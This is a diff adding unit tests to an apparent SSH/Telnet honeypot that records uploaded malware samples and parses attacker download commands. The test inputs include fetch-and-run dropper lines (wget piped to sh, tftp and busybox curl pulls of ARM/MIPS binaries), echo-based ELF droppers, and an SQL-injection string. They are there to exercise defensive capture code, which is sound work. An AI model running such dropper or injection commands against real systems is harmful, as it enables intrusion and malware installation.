@@ -19,6 +19,7 @@ import fakeshell
 import paramiko
 import intel
 import parsers
+import samples
 import sensors
 import stats
 import visits
@@ -108,7 +109,13 @@ class StoreStatsTests(unittest.TestCase):
         self.assertIsNone(sensors.ingest(self.store, "oci", lines(0)))  # nichts doppelt
         self.assertEqual(self.store.events_where("sensor", "oci", 0)[0], 1)
         self.assertEqual(self.store.events_where("sensor", "3lis", 0)[0], 3)
-        self.assertEqual(stats.compute(self.store, "1h")["sensorsTop"], [{"sensor": "3lis", "n": 3}, {"sensor": "oci", "n": 1}])
+        s = stats.compute(self.store, "1h")
+        self.assertEqual([(x["sensor"], x["n"]) for x in s["sensors"]], [("3lis", 3), ("oci", 1)])
+        only = stats.compute(self.store, "1h", "oci")
+        self.assertEqual((only["total"], only["byType"]), (1, [{"type": "SSH-Probe", "n": 1}]))
+        self.assertEqual(len(only["sensors"]), 2)  # die Sensor-Karten zeigen immer alle
+        with self.assertRaises(ValueError):
+            stats.compute(self.store, "1h", "x') OR 1=1 --")
         self.store.set_offset("sensor:oci", 0, 50)  # Sensor-DB neu angelegt (max < letzte ID)
         self.assertEqual(sensors.ingest(self.store, "oci", lines(0)), 1)
 
@@ -184,6 +191,10 @@ class VisitsTests(unittest.TestCase):
                                       {"day": "2026-10-20", "visitors": 2, "views": 3}])
         self.assertEqual(s["monthly"], [{"period": "2026-10", "visitors": 3, "views": 4}])
         self.assertEqual(s["pages"][0], ("/", 3))
+
+
+SAMPLES = tempfile.TemporaryDirectory()
+samples.DIR = SAMPLES.name  # Tests legen nie etwas unter /var/lib ab
 
 
 class HoneypotBase(unittest.TestCase):
@@ -316,6 +327,40 @@ class SSHHoneypotTests(HoneypotBase):
     def tearDown(self):
         self.tmp.cleanup()
 
+    def session(self):
+        client = paramiko.Transport(("127.0.0.1", self.pot.port))
+        client.start_client(timeout=10)
+        client.auth_password("root", "toor")
+        return client, client.open_session()
+
+    def test_scp_and_cat_uploads_become_samples(self):
+        elf = b"\x7fELF\x01\x01\x01" + b"\0" * 11 + b"\x28\x00" + b"\0" * 100  # ARM
+        client, chan = self.session()
+        chan.exec_command("scp -t /tmp/")
+        self.assertEqual(chan.recv(1), b"\0")
+        chan.sendall(f"C0755 {len(elf)} bot.arm\n".encode())
+        self.assertEqual(chan.recv(1), b"\0")
+        chan.sendall(elf + b"\0")
+        self.assertEqual(chan.recv(1), b"\0")
+        chan.shutdown_write()
+        chan.recv_exit_status()
+        client.close()
+        client, chan = self.session()  # der Honeypot bedient einen Kanal je Verbindung
+        chan.exec_command("cat > .s; chmod +x .s")
+        chan.sendall(b"#!/bin/sh\nwget x\n")
+        chan.shutdown_write()
+        chan.recv_exit_status()
+        client.close()
+        rows = [r for r in self.wait_events(5) if r[0] == "Malware-Sample"]
+        self.assertEqual(len(rows), 2, rows)
+        digest = samples.hashlib.sha256(elf).hexdigest()
+        self.assertEqual(rows[0][2], f"Sample „{digest}“ · {len(elf)} B · ELF ARM · scp bot.arm")
+        self.assertTrue(rows[1][2].endswith("· Skript · cat > .s; chmod +x .s"))
+        self.assertEqual(open(os.path.join(SAMPLES.name, digest), "rb").read(), elf)
+        top = stats.compute(self.store, "24h")["samplesTop"]
+        self.assertEqual({(s["kind"], s["n"]) for s in top}, {("ELF ARM", 1), ("Skript", 1)})
+        self.assertEqual(self.store.events_where("sample", digest, 0)[0], 1)
+
     def test_key_denied_password_accepted_commands_recorded(self):
         client = paramiko.Transport(("127.0.0.1", self.pot.port))
         client.start_client(timeout=10)
@@ -371,6 +416,16 @@ class TelnetHoneypotTests(HoneypotBase):
             ("high", "Login-Versuch als „admin“ · Passwort „1234“"), ("crit", "Befehl „enable“"),
             ("crit", "Befehl „/bin/busybox MIRAI“"), ("crit", "Befehl „exit“")])
 
+    def test_echo_dropper_is_saved_after_disconnect(self):
+        with socket.create_connection(("127.0.0.1", self.pot.port), timeout=5) as sock:
+            sock.sendall(b"root\r\nroot\r\n")
+            sock.sendall(b"echo -ne '\\x7f\\x45\\x4c\\x46\\x01\\x01' > .d\r\n")
+            sock.sendall(b"echo -ne '" + b"\\x00" * 12 + b"\\x08\\x00' >> .d\r\n")
+            time.sleep(0.3)
+        rows = self.wait_events(4)
+        self.assertEqual(rows[-1][0], "Malware-Sample")
+        self.assertIn("· 20 B · ELF MIPS · echo > .d", rows[-1][2])
+
 
 class FakeShellTests(unittest.TestCase):
     def test_responses(self):
@@ -378,6 +433,24 @@ class FakeShellTests(unittest.TestCase):
         self.assertEqual(fakeshell.respond("cd /tmp; wget http://x/y.sh"), "wget: download timed out\r\n")
         self.assertEqual(fakeshell.respond("foo"), "sh: foo: not found\r\n")
         self.assertIsNone(fakeshell.respond("ls; exit"))
+
+    def test_downloads_and_drops(self):
+        self.assertEqual(fakeshell.downloads(
+            "cd /tmp; wget http://1.2.3.4/x.sh -O- | sh; busybox curl -o y 5.6.7.8/y; tftp -g -r m.arm 9.9.9.9; "
+            "tftp 8.8.8.8 -c get n.mips; ftpget a b c; wget ftp://h/z"),
+            ["http://1.2.3.4/x.sh", "http://5.6.7.8/y", "tftp://9.9.9.9/m.arm", "tftp://8.8.8.8/n.mips"])
+        self.assertEqual(fakeshell.respond("echo -ne '\\x41' > .t"), "")
+        drops = fakeshell.Drops()
+        drops.feed("echo -ne '\\x41\\x42' > .t; echo x")
+        drops.feed("echo -ne '\\x43' >> .t")
+        self.assertEqual(drops.files, {".t": b"ABC"})
+        self.assertFalse(samples.looks_executable(b"ABC"))
+
+    def test_samples_only_from_public_addresses(self):
+        with self.assertRaises(ValueError):
+            samples.public_ip("127.0.0.1")
+        with self.assertRaises(ValueError):
+            samples.public_ip("192.168.203.3")
 
     def test_lines_split_on_any_line_end(self):
         chunks = iter([b"a\r", b"\nb\rc", b"\n", b""])
